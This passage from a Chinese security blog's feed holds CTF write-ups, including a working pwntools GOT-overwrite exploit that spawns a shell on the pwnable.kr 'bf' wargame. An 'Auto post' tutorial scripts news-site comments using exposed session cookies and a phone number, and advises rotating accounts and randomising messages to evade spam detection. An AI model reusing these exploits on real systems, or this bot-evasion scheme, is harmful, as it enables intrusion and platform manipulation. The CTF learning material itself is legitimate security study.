class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line"><span class="comment"># p = process('./bf')</span></div><div class="line">p = remote(<span class="string">'pwnable.kr'</span>,<span class="number">9001</span>)</div><div class="line">elf = ELF(<span class="string">'bf'</span>)</div><div class="line"><span class="comment">#readelf -s bf_libc.so |grep system</span></div><div class="line">libc_system_addr = <span class="number">0x0003f250</span></div><div class="line">libc_setvbuf_addr = <span class="number">0x00067f70</span></div><div class="line">libc_gets_addr = <span class="number">0x00066e50</span></div><div class="line">p_addr = <span class="number">0x0804A0A0</span></div><div class="line">vul_addr = <span class="number">0x08048671</span></div><div class="line">putchar_got = elf.got[<span class="string">'putchar'</span>]</div><div class="line">setvbuf_got = elf.got[<span class="string">'setvbuf'</span>]</div><div class="line">memset_got =  elf.got[<span class="string">'memset'</span>]</div><div class="line">fgets_got  = elf.got[<span class="string">'fgets'</span>]</div><div class="line"></div><div class="line">payload  = <span class="string">''</span></div><div class="line">payload += <span class="string">'&lt;'</span>*(p_addr-setvbuf_got) <span class="comment"># point to setvbuf_got</span></div><div class="line">payload += <span class="string">'.'</span>+<span class="string">'&gt;'</span>+<span class="string">'.'</span>+<span class="string">'&gt;'</span>+<span class="string">'.'</span>+<span class="string">'&gt;'</span>+<span class="string">'.'</span>+<span class="string">'&gt;'</span>+ <span class="string">'&lt;'</span>*<span class="number">4</span> <span class="comment">#leak setvbuf()</span></div><div class="line">payload += <span class="string">'&gt;'</span>*(putchar_got-setvbuf_got)<span class="comment">#point to putchar_got</span></div><div class="line">payload += <span class="string">','</span>+<span class="string">'&gt;'</span>+<span class="string">','</span>+<span class="string">'&gt;'</span>+<span class="string">','</span>+<span class="string">'&gt;'</span>+<span class="string">','</span>+<span class="string">'&gt;'</span>+<span class="string">'&lt;'</span>*<span class="number">4</span> <span class="comment">#change putchar() to vul_addr</span></div><div class="line">payload += <span class="string">'&lt;'</span>*(putchar_got-memset_got)<span class="comment">#point to memset_got</span></div><div class="line">payload += <span class="string">','</span>+<span class="string">'&gt;'</span>+<span class="string">','</span>+<span class="string">'&gt;'</span>+<span class="string">','</span>+<span class="string">'&gt;'</span>+<span class="string">','</span>+<span class="string">'&gt;'</span>+<span class="string">'&lt;'</span>*<span class="number">4</span> <span class="comment">#change memset() to gets()</span></div><div class="line">payload += <span class="string">'&lt;'</span>*(memset_got-fgets_got)<span class="comment">#point to fgets_got</span></div><div class="line">payload += <span class="string">','</span>+<span class="string">'&gt;'</span>+<span class="string">','</span>+<span class="string">'&gt;'</span>+<span class="string">','</span>+<span class="string">'&gt;'</span>+<span class="string">','</span>+<span class="string">'&gt;'</span>+<span class="string">'&lt;'</span>*<span class="number">4</span> <span class="comment">#change fgets() to gets()</span></div><div class="line">payload +=<span class="string">'.'</span></div><div class="line"><span class="keyword">print</span> <span class="string">'length = '</span>+hex(len(payload))</div><div class="line"><span class="comment"># gdb.attach(p,'b*0x804865A\nb*0x8048648\nc')</span></div><div class="line">p.recvuntil(<span class="string">'pt [ ]\n'</span>)</div><div class="line">p.sendline(payload)</div><div class="line">leak = p.recv(<span class="number">1</span>)+p.recv(<span class="number">1</span>)+p.recv(<span class="number">1</span>)+p.recv(<span class="number">1</span>)</div><div class="line">leak_setvbuf = u32(leak)</div><div class="line"><span class="keyword">print</span> <span class="string">'putchar_got_addr = '</span>+hex(putchar_got)</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">'leak_setvbuf = '</span>+hex(leak_setvbuf)</div><div class="line"></div><div class="line">system_addr = leak_setvbuf - (libc_setvbuf_addr-libc_system_addr)</div><div class="line">gets_addr = leak_setvbuf - (libc_setvbuf_addr-libc_gets_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">'system_addr = '</span> + hex(system_addr) </div><div class="line"><span class="keyword">print</span> <span class="string">'gets_addr = '</span>+hex(gets_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">'###change putchar to  vul_addr'</span></div><div class="line">p.send(p32(vul_addr))</div><div class="line"><span class="keyword">print</span> <span class="string">'###change memset to  gets'</span></div><div class="line">p.send(p32(gets_addr))</div><div class="line"><span class="keyword">print</span> <span class="string">'###change fgets to system'</span></div><div class="line">p.send(p32(system_addr))</div><div class="line"><span class="keyword">print</span> <span class="string">"###send '/bin/sh'"</span></div><div class="line">p.sendline(<span class="string">'/bin/sh\0'</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> wargame </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[2015-问鼎杯线下PWN]]></title>
      <url>/2016/06/08/2015-%E9%97%AE%E9%BC%8E%E6%9D%AF%E7%BA%BF%E4%B8%8BPWN/</url>
      <content type="html"><![CDATA[<p>这题当时没做出了哎。。好吧，其实考察点是整型溢出。。。挺有价值的一题题目。<br>题目地址：<a href="https://github.com/Winter3un/ctf_task" target="_blank" rel="external">https://github.com/Winter3un/ctf_task</a><br>通过逆向得知，题目需要密码，而密码是通过一个算法得到的，要输入一个字符串满足这个算法，但是在32位内，我们的任何输入都满足不了条件，突然发现这边可以进行整型溢出（超过32位的数据，寄存器将丢弃）<br>那么我们可以构造类似于0x1ae312d386d209这样的数据，高于32位的数据将会被丢弃。即<code>0x1ae312d386d209</code> == <code>0xD386D209</code><br>exp如下:<br> <a id="more"></a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">end = <span class="string">'D386D209'</span></div><div class="line"><span class="comment"># start = 5381</span></div><div class="line"><span class="keyword">import</span> sys   </div><div class="line">sys.setrecursionlimit(<span class="number">1000000</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(end)</span>:</span></div><div class="line">	<span class="keyword">if</span> end == <span class="number">5381</span>:</div><div class="line">		<span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">	<span class="keyword">if</span> end &lt;<span class="number">5381</span>:</div><div class="line">		<span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0xff</span>+<span class="number">1</span>):</div><div class="line">		<span class="keyword">if</span> (end - x) % <span class="number">33</span> ==<span class="number">0</span>:</div><div class="line">			flag = get((end - x) / <span class="number">33</span>)</div><div class="line">			<span class="keyword">if</span> flag:</div><div class="line">				<span class="keyword">print</span> hex(end),hex(x)</div><div class="line">				<span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">			<span class="keyword">else</span>:</div><div class="line">				<span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">				</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0xffffff</span>):</div><div class="line">	tmp  = int(hex(x).replace(<span class="string">'0x'</span>,<span class="string">''</span>)+end,<span class="number">16</span>)</div><div class="line">	<span class="keyword">if</span> (tmp - <span class="number">0xa</span>) % <span class="number">33</span> ==<span class="number">0</span>:</div><div class="line">		<span class="keyword">if</span> get((tmp - <span class="number">0x0a</span>) / <span class="number">33</span>):</div><div class="line">			<span class="keyword">print</span> hex(tmp),hex(<span class="number">0x0a</span>)</div><div class="line">			<span class="keyword">print</span> <span class="string">'end'</span></div><div class="line">			exit(<span class="number">0</span>)</div></pre></td></tr></table></figure></p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[【pwn】诡异的movsx和cdqe]]></title>
      <url>/2016/06/08/%E3%80%90pwn%E3%80%91%E8%AF%A1%E5%BC%82%E7%9A%84movsx%E5%92%8Ccdqe/</url>
      <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>这是在做hack.lu 2014 的pwn的一题时发现的，也算补一波自己的汇编姿势了。<br><img src="/2016/06/08/【pwn】诡异的movsx和cdqe/1.png" alt="1.png" title=""><br> <a id="more"></a></p>
<h3 id="科普"><a href="#科普" class="headerlink" title="科普"></a>科普</h3><p>一般而言，我们定义一个字符型数据，正常认识中，我们默认它是无符号的。<br><code>char a;</code> <strong>错误认知：这是无符号的。</strong><br>但是实际上编译器默认将其认为是有符号的。<br>当我们输入<code>&#39;\x7f&#39;</code>时，32位下转换成整形后其数据为<code>0x0000007f</code><br>当我们输入<code>&#39;\x80&#39;</code>时，32位下转换成整形后其数据为<code>0xffffff80</code></p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>在这边movsx为<code>带符号位扩展</code>，cdqe为<code>转换DWORD(eax)成QWORD(RAX)</code>，所以经过这两步操作，我们的1个字节的字符型数据成功转换成了8字节整型数据，而且是带符号的。那么该整形数据的取证范围为<code>-7f~+7f</code><br>所以我们可以利用该属性进行整型溢出（想想都兴奋），比如这个数据正好我们能控制，正好该数据是数组的索引。。那么我们就能够取到这个数组地址之前0x7f范围内的数据</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> bin </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Auto post]]></title>
      <url>/2016/06/08/Auto-post/</url>
      <content type="html"><![CDATA[<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>某个坑爹的小伙伴说只要我做出这玩意就请我吃3斤龙虾，于是我本着社会主义精神，昧着虾心，来写这篇文章。</p>
<p>主要用的知识点：</p>
<ol>
<li>python编程</li>
<li>http协议包分析</li>
<li>requests库文件的使用</li>
</ol>
<a id="more"></a>
<p>预备环境：</p>
<ol>
<li>windows平台</li>
<li>python2.7</li>
<li>requests库</li>
<li>python路径已经添加至环境变量，requests库已经安装</li>
</ol>
<h3 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h3><p>首先我们使用chrome 打开地址<a href="http://comment.news.163.com/news_guonei8_bbs/BNCFDKN900014PRF.html" target="_blank" rel="external">http://comment.news.163.com/news_guonei8_bbs/BNCFDKN900014PRF.html</a></p>
<p>这是我要顶的那个贴的地址。</p>
<p>随意登录一个帐号（我们要跟帖，必须要登录帐号）</p>
<p>然后按<code>F12</code>打开开发者工具，并切换到<code>Network</code>选项卡。</p>
<img src="/2016/06/08/Auto-post/1.png" alt="1.png" title="">
<p>接着我们输入我们要跟帖的文字，注意，文字内容必须健康向上符合《互联网管理办法》，然后点击<code>马上发表</code></p>
<img src="/2016/06/08/Auto-post/2.png" alt="2.png" title="">
<p>我们在第三个请求包中发现了我们传输过去的内容，同时发现我们的跟帖正在被审核（这边我不清楚是否是人工审核，讲道理应该不会是人工审核，人工审核的话，用自动化脚本来跟帖会比较的麻烦）</p>
<img src="/2016/06/08/Auto-post/3.png" alt="3.png" title="">
<p>点击<code>view source</code> 可以更详细的看到协议包的内容。</p>
<img src="/2016/06/08/Auto-post/4.png" alt="4.png" title="">
<p>我们可以看到，这是一个POST请求包，所以我们需要构造一个post的请求包，有一些字段是没有用的，这里只说对我们跟帖起到作用的字段：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">POST /api/v1/products/a2869674571f77b5a0867c3d71db5856/threads/BNCFDKN900014PRF/comments?ibc=newspc HTTP/1.1</div><div class="line">Host: comment.news.163.com</div><div class="line"></div><div class="line">##这是贴子的地址</div></pre></td></tr></table></figure>
<p><code>cookie</code>这是用来验证用户身份的。<br><code>Form data</code>这是urlencode过的数据，点击view source便可以看到，是我们发表的内容。</p>
<img src="/2016/06/08/Auto-post/5.png" alt="5.png" title="">
<p>接下来便是构造请求包了</p>
<h3 id="请求包构造"><a href="#请求包构造" class="headerlink" title="请求包构造"></a>请求包构造</h3><p>我们这里使用的是python的requests的库。一个简单的请求如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">from requests import *</div><div class="line">r = get(&quot;http://www.baidu.com&quot;)</div><div class="line">print r.content</div><div class="line"></div><div class="line">## 这样我们就对百度首页进行了一次get请求</div></pre></td></tr></table></figure></p>
<p>我们也可以换成<code>post</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">from requests import *</div><div class="line">r = post(&quot;http://www.baidu.com&quot;)</div><div class="line">print r.content</div><div class="line"></div><div class="line">## 一次post请求便完成了</div></pre></td></tr></table></figure>
<p>至此我们解决了请求方式的问题以及请求地址的问题。<br>我们还需要解决的是cookie的问题和form data的问题。<br>查看官方文档<a href="http://www.python-requests.org/en/master/user/quickstart/#cookies" target="_blank" rel="external">http://www.python-requests.org/en/master/user/quickstart/#cookies</a></p>
<img src="/2016/06/08/Auto-post/6.png" alt="6.png" title="">
<p>以下是我们请求包里面的cookie值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">_ntes_nuid=910ac3d80a183cd3806dd61479b09d76; usertrack=c+5+hlb7Xhm3WHMlAxSMAg==; _ntes_nnid=b99c6cd761700dcd9345852c71c6137e,1459314268699; _ga=GA1.2.1744200486.1459314269; JSESSIONID-WNC-98XSE=91eb6ff75c89cf758a1a778ff385f3f3a74f1121d1c717f361c42438c4b861d1bee3860c17f7152d419286d103fcd9760e369e6177e38ab70a4d3896743946ce45cd2fd4b0cef4e9ab50fa9047eac2b40960b83b08ffd6ea6306208ac98d45208b87244e260fead013d6c9f3dd8078a8c5d046153453d4c0048246af85b65f19ed6d791d%3A1463715848426; _lkiox7665q_=26; NTES_SESS=UwvXj.cllvWvGy06Xm5xYdTV65rofunn.uAvp7LJVuC3krW0kCD17oXOuWkN13rSNfN24o9GOSeZ_RzjzJBK52oIUbeglGU9r6FIYdH33u4KPMqU1PAMgi8FaUMyCHbHJPZHabBJF3yw1OxP5WeKWrGwMgjUrlVzi95aEMdWPPSsHdX.mY1BQdlxAPegQ0tDS; S_INFO=1463712243|0|2&amp;70##|m18258122031_1; P_INFO=m18258122031_1@163.com|1463712243|1|content|00&amp;99|null&amp;null&amp;null#zhj&amp;330400#10#0#0|182031&amp;1||18258122031@163.com; NTES_PASSPORT=1t7E4WQRb3Gqgim1fjBWGBw22D8bHgaP.vGnIggM7YVj7LHE7Muc9bwRsH7TclLKTywQ6tmMF8hT7Z6XsXmqM5WRpL2ENY3u4pyXoQBxiRITx; ANTICSRF=b52fe9b761cd7166754a07a2814a3956; NTES_CMT_USER_INFO=99679345%7Cm182****2031_1%7C%7Cfalse%7CbTE4MjU4MTIyMDMxXzFAMTYzLmNvbQ%3D%3D; n_ht_s=1; cm_newmsg=user%3Dm18258122031_1%26new%3D-1%26total%3D-1; NTES_REPLY_NICKNAME=m18258122031_1%40163.com%7Cm18258122031_1%7C%7C%7C%7C1t7E4WQRb3Gqgim1fjBWGBw22D8bHgaP.vGnIggM7YVj7LHE7Muc9bwRsH7TclLKTywQ6tmMF8hT7Z6XsXmqM5WRpL2ENY3u4pyXoQBxiRITx%7C1%7C-1; cmt_vin=e754154fe4a567dd44864ffe1658fa37e24258408af0e2e319bbe3bbccdfb0f2</div></pre></td></tr></table></figure></p>
<p>然后我们按照官方文档所说的，构造cookie字段。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cookies = &#123;&apos;_ntes_nuid&apos;:&apos;910ac3d80a183cd3806dd61479b09d76&apos;,&apos;usertrack&apos;:&apos;c+5+hlb7Xhm3WHMlAxSMAg==&apos;,&apos;_ntes_nnid&apos;:&apos;b99c6cd761700dcd9345852c71c6137e,1459314268699&apos;,&apos;_ga&apos;:&apos;GA1.2.1744200486.1459314269&apos;,&apos;JSESSIONID-WNC-98XSE&apos;:&apos;91eb6ff75c89cf758a1a778ff385f3f3a74f1121d1c717f361c42438c4b861d1bee3860c17f7152d419286d103fcd9760e369e6177e38ab70a4d3896743946ce45cd2fd4b0cef4e9ab50fa9047eac2b40960b83b08ffd6ea6306208ac98d45208b87244e260fead013d6c9f3dd8078a8c5d046153453d4c0048246af85b65f19ed6d791d%3A1463715848426&apos;,&apos;_lkiox7665q_&apos;:&apos;26&apos;,&apos;NTES_SESS&apos;:&apos;UwvXj.cllvWvGy06Xm5xYdTV65rofunn.uAvp7LJVuC3krW0kCD17oXOuWkN13rSNfN24o9GOSeZ_RzjzJBK52oIUbeglGU9r6FIYdH33u4KPMqU1PAMgi8FaUMyCHbHJPZHabBJF3yw1OxP5WeKWrGwMgjUrlVzi95aEMdWPPSsHdX.mY1BQdlxAPegQ0tDS&apos;,&apos;S_INFO&apos;:&apos;1463712243|0|2&amp;70##|m18258122031_1&apos;,&apos;P_INFO&apos;:&apos;m18258122031_1@163.com|1463712243|1|content|00&amp;99|null&amp;null&amp;null#zhj&amp;330400#10#0#0|182031&amp;1||18258122031@163.com&apos;,&apos;NTES_PASSPORT&apos;:&apos;1t7E4WQRb3Gqgim1fjBWGBw22D8bHgaP.vGnIggM7YVj7LHE7Muc9bwRsH7TclLKTywQ6tmMF8hT7Z6XsXmqM5WRpL2ENY3u4pyXoQBxiRITx&apos;,&apos;ANTICSRF&apos;:&apos;b52fe9b761cd7166754a07a2814a3956&apos;,&apos;NTES_CMT_USER_INFO&apos;:&apos;99679345%7Cm182****2031_1%7C%7Cfalse%7CbTE4MjU4MTIyMDMxXzFAMTYzLmNvbQ%3D%3D&apos;,&apos;n_ht_s&apos;:&apos;1&apos;,&apos;cm_newmsg&apos;:&apos;user%3Dm18258122031_1%26new%3D-1%26total%3D-1&apos;,&apos;NTES_REPLY_NICKNAME&apos;:&apos;m18258122031_1%40163.com%7Cm18258122031_1%7C%7C%7C%7C1t7E4WQRb3Gqgim1fjBWGBw22D8bHgaP.vGnIggM7YVj7LHE7Muc9bwRsH7TclLKTywQ6tmMF8hT7Z6XsXmqM5WRpL2ENY3u4pyXoQBxiRITx%7C1%7C-1&apos;,&apos;cmt_vin&apos;:&apos;e754154fe4a567dd44864ffe1658fa37e24258408af0e2e319bbe3bbccdfb0f2&apos;&#125;</div></pre></td></tr></table></figure></p>
<p>然后构造data发送post包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">url  = &apos;http://comment.news.163.com/api/v1/products/a2869674571f77b5a0867c3d71db5856/threads/BNCFDKN900014PRF/comments?ibc=newspc&apos;</div><div class="line">data = dict(content=&apos;支持习总书记，捍卫祖国安全，相信能带领中国的百姓实现愿望。&apos;,parentId=&apos;&apos;,board=&apos;news_guonei8_bbs&apos;)</div><div class="line">r = post(url, cookies=cookies,data=data)</div></pre></td></tr></table></figure></p>
<p>整理下,脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf8 -*-</span></div><div class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</div><div class="line"></div><div class="line">url  = <span class="string">'http://comment.news.163.com/api/v1/products/a2869674571f77b5a0867c3d71db5856/threads/BNCFDKN900014PRF/comments?ibc=newspc'</span></div><div class="line"></div><div class="line">data = dict(content=<span class="string">'支持习总书记，捍卫祖国安全，相信能带领中国的百姓实现愿望。'</span>,parentId=<span class="string">''</span>,board=<span class="string">'news_guonei8_bbs'</span>)</div><div class="line"></div><div class="line">cookies =&#123;<span class="string">'_ntes_nuid'</span>:<span class="string">'910ac3d80a183cd3806dd61479b09d76'</span>,<span class="string">'usertrack'</span>:<span class="string">'c+5+hlb7Xhm3WHMlAxSMAg=='</span>,<span class="string">'_ntes_nnid'</span>:<span class="string">'b99c6cd761700dcd9345852c71c6137e,1459314268699'</span>,<span class="string">'_ga'</span>:<span class="string">'GA1.2.1744200486.1459314269'</span>,<span class="string">'JSESSIONID-WNC-98XSE'</span>:<span class="string">'91eb6ff75c89cf758a1a778ff385f3f3a74f1121d1c717f361c42438c4b861d1bee3860c17f7152d419286d103fcd9760e369e6177e38ab70a4d3896743946ce45cd2fd4b0cef4e9ab50fa9047eac2b40960b83b08ffd6ea6306208ac98d45208b87244e260fead013d6c9f3dd8078a8c5d046153453d4c0048246af85b65f19ed6d791d%3A1463715848426'</span>,<span class="string">'_lkiox7665q_'</span>:<span class="string">'26'</span>,<span class="string">'NTES_SESS'</span>:<span class="string">'UwvXj.cllvWvGy06Xm5xYdTV65rofunn.uAvp7LJVuC3krW0kCD17oXOuWkN13rSNfN24o9GOSeZ_RzjzJBK52oIUbeglGU9r6FIYdH33u4KPMqU1PAMgi8FaUMyCHbHJPZHabBJF3yw1OxP5WeKWrGwMgjUrlVzi95aEMdWPPSsHdX.mY1BQdlxAPegQ0tDS'</span>,<span class="string">'S_INFO'</span>:<span class="string">'1463712243|0|2&amp;70##|m18258122031_1'</span>,<span class="string">'P_INFO'</span>:<span class="string">'m18258122031_1@163.com|1463712243|1|content|00&amp;99|null&amp;null&amp;null#zhj&amp;330400#10#0#0|182031&amp;1||18258122031@163.com'</span>,<span class="string">'NTES_PASSPORT'</span>:<span class="string">'1t7E4WQRb3Gqgim1fjBWGBw22D8bHgaP.vGnIggM7YVj7LHE7Muc9bwRsH7TclLKTywQ6tmMF8hT7Z6XsXmqM5WRpL2ENY3u4pyXoQBxiRITx'</span>,<span class="string">'ANTICSRF'</span>:<span class="string">'b52fe9b761cd7166754a07a2814a3956'</span>,<span class="string">'NTES_CMT_USER_INFO'</span>:<span class="string">'99679345%7Cm182****2031_1%7C%7Cfalse%7CbTE4MjU4MTIyMDMxXzFAMTYzLmNvbQ%3D%3D'</span>,<span class="string">'n_ht_s'</span>:<span class="string">'1'</span>,<span class="string">'cm_newmsg'</span>:<span class="string">'user%3Dm18258122031_1%26new%3D-1%26total%3D-1'</span>,<span class="string">'NTES_REPLY_NICKNAME'</span>:<span class="string">'m18258122031_1%40163.com%7Cm18258122031_1%7C%7C%7C%7C1t7E4WQRb3Gqgim1fjBWGBw22D8bHgaP.vGnIggM7YVj7LHE7Muc9bwRsH7TclLKTywQ6tmMF8hT7Z6XsXmqM5WRpL2ENY3u4pyXoQBxiRITx%7C1%7C-1'</span>,<span class="string">'cmt_vin'</span>:<span class="string">'e754154fe4a567dd44864ffe1658fa37e24258408af0e2e319bbe3bbccdfb0f2'</span>&#125;</div><div class="line"></div><div class="line">r = post(url, cookies=cookies,data=data)</div><div class="line"></div><div class="line"><span class="keyword">print</span> r.content.decode(<span class="string">'utf8'</span>)</div></pre></td></tr></table></figure></p>
<p>最后一行为，打印出返回的内容<br>成功截图</p>
<img src="/2016/06/08/Auto-post/7.jpg" alt="7.jpg" title="">
<p>结束语：如果想自动顶帖，写个循环就可以啦，不过用同一个用户，容易被封，多搞几个cookie就行了嘛，也不要一直用同一句话，可以做个字典啊，随机选一句话，随机选一个用户，然后发表，最后时间也可以随机选，那样被服务器检测到的概率就大大降低了~~yes~完成。</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> code </tag>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[[pwn] 关于栈的迁移]]></title>
      <url>/2016/05/20/pwn-%E5%85%B3%E4%BA%8E%E6%A0%88%E7%9A%84%E8%BF%81%E7%A7%BB/</url>
      <content type="html"><![CDATA[<h2 id="pwn-关于栈的迁移"><a href="#pwn-关于栈的迁移" class="headerlink" title="[pwn] 关于栈的迁移"></a>[pwn] 关于栈的迁移</h2><p>在我们仅仅只能够控制ebp的情况下，我们怎么才能够控制eip去拿到我们的shell呢。</p>
<h3 id="以下为科普"><a href="#以下为科普" class="headerlink" title="以下为科普"></a>以下为科普</h3><p>以32位程序举例，在使用<code>call</code>这个命令，进入一个函数的时候,程序会进行一系列栈操作:<br><code>push eip+4;push ebp;mov ebp,esp;</code>来保护现场，避免执行完函数后堆栈不平衡以及找不到之前的入口地址。</p>
<p>执行完函数后会进行一系列操作来还原现场<code>leave;ret;</code><br>这边的leave就相当于进入函数栈操作的逆过程。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">leave  == mov esp,ebp;pop ebp;</div><div class="line">ret    == pop eip #弹出栈顶数据给eip寄存器</div></pre></td></tr></table></figure></p>
<p>这样如果能够控制栈空间到任意地址，那么我们就能利用ret来控制eip的数据了（栈顶数据）<br> <a id="more"></a></p>
<h3 id="进入主题"><a href="#进入主题" class="headerlink" title="进入主题"></a>进入主题</h3><p>这次我碰到的这题题目是来自于pwnable的login。<br>我们只能够控制ebp的数据，关键的返回地址的数据由于输入长度的限制并不能控制，然而我们还是可以通过控制ebp来绕过限制。</p>
<p>由于<code>ret</code>返回的是栈顶数据，而栈顶地址是由esp寄存器的值决定的，也就是说如果我们控制了esp寄存器的数据，那么我们也就能够控制ret返回的栈顶数据。</p>
<p>现在我们已经知道了 level能够将ebp寄存器的数据mov到esp寄存器中，然而，一开始ebp寄存器中的值并不是由我们来决定的，重点是接下来的那个<code>pop ebp</code>的操作，该操作将栈中保存的ebp数据赋值给了ebp寄存器，而我们正好能够控制该部分数据。所以利用思路便成立了。</p>
<p>我们首先将栈中保存ebp数据的地址空间控制为我们想要栈顶地址，再利用两次<code>leave</code>操作<code>mov esp,ebp;pop ebp;mov esp,ebp;pop ebp;</code>将esp寄存器中的值变成我们想让它成为的值。由于最后还有一个<code>pop ebp</code>操作多余，该操作将导致<code>esp-4</code>，所以在构造ret的数据时应当考虑到将数据放到我们构造的esp地址-4的位置。</p>
<p><strong>注意该利用需要两次leave哦~</strong></p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> bin </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[hexo build]]></title>
      <url>/2016/05/19/hexo-build/</url>
      <content type="html"><![CDATA[<h2 id="首先你得有个自己的github账户"><a href="#首先你得有个自己的github账户" class="headerlink" title="首先你得有个自己的github账户"></a>首先你得有个自己的github账户</h2><p><a href="www.github.com">www.github.com</a></p>
<p>注册完成后，新建一个名为<code>YOURUSERNAME.github.io</code>仓库，并在设置内将该仓库设置为gitpage</p>
<img src="/2016/05/19/hexo-build/2.png" alt="2.png" title="">
<img src="/2016/05/19/hexo-build/3.png" alt="3.png" title="">
<h2 id="在linux本地设置好git"><a href="#在linux本地设置好git" class="headerlink" title="在linux本地设置好git"></a>在linux本地设置好git</h2><a id="more"></a>
<p>推荐文档</p>
<p><a href="http://crazymilk.github.io/2015/12/28/GitHub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" target="_blank" rel="external">http://crazymilk.github.io/2015/12/28/GitHub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</a></p>
<h2 id="hexo安装"><a href="#hexo安装" class="headerlink" title="hexo安装"></a>hexo安装</h2><p>推荐官方安装文档。<br><a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="external">https://hexo.io/zh-cn/docs/</a></p>
<img src="/2016/05/19/hexo-build/1.png" alt="1.png" title="">
<h2 id="博客初始化"><a href="#博客初始化" class="headerlink" title="博客初始化"></a>博客初始化</h2><p>还是推荐官方文档<br><a href="https://hexo.io/zh-cn/docs/setup.html" target="_blank" rel="external">https://hexo.io/zh-cn/docs/setup.html</a></p>
<h2 id="主题切换"><a href="#主题切换" class="headerlink" title="主题切换"></a>主题切换</h2><p><a href="https://github.com/Winter3un/hexo-theme-yilia" target="_blank" rel="external">https://github.com/Winter3un/hexo-theme-yilia</a></p>
<h2 id="备份插件"><a href="#备份插件" class="headerlink" title="备份插件"></a>备份插件</h2><p><a href="https://github.com/coneycode/hexo-git-backup" target="_blank" rel="external">https://github.com/coneycode/hexo-git-backup</a></p>
<h2 id="写文章"><a href="#写文章" class="headerlink" title="写文章"></a>写文章</h2><p>hexo分为原始文件和发布文件两种。</p>
<p>首先需要用户写好原始文件，然后使用<code>hexo g</code>来生成发布文件。</p>
<p>接着将生成好的发布文件，<code>hexo d</code> 推送到服务器上。</p>
<p>简略命令<code>hexo g -d</code></p>
<p>资料：<a href="https://hexo.io/zh-cn/docs/writing.html" target="_blank" rel="external">https://hexo.io/zh-cn/docs/writing.html</a><br><a href="https://hexo.io/zh-cn/docs/generating.html" target="_blank" rel="external">https://hexo.io/zh-cn/docs/generating.html</a></p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> code </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mprotect 之痛]]></title>
      <url>/2016/05/18/mprotect/</url>
      <content type="html"><![CDATA[<p>这道题目源自于 2016安云杯，题目原题可以在文章最后的附件里下载。</p>
